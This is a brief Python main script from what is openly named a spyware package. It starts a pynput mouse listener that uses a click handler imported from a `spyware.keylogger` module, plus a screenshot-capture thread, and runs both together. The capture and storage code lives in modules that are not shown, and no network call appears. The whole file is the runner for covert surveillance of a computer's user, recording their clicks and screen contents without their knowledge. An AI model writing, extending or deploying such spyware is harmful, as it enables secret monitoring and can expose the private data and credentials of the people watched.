from pynput import mouse

import threading

from spyware.keylogger import on_click
from spyware.screenshot import ScreenshotThread

if __name__ == '__main__':
    # with mouse.Listener(
    #         on_move=on_move,
    #         # on_click=on_click,
    #         on_scroll=on_scroll) as listener:
    #     listener.join()

    # ...or, in a non-blocking fashion:
    listener = mouse.Listener(
        # on_move=on_move,
        on_click=on_click,
        # on_scroll=on_scroll
    )
    listener.start()
    screenshot_consumer = ScreenshotThread()
    screenshot_consumer.start()
    screenshot_consumer.join()
    listener.join()
    # time.sleep(100)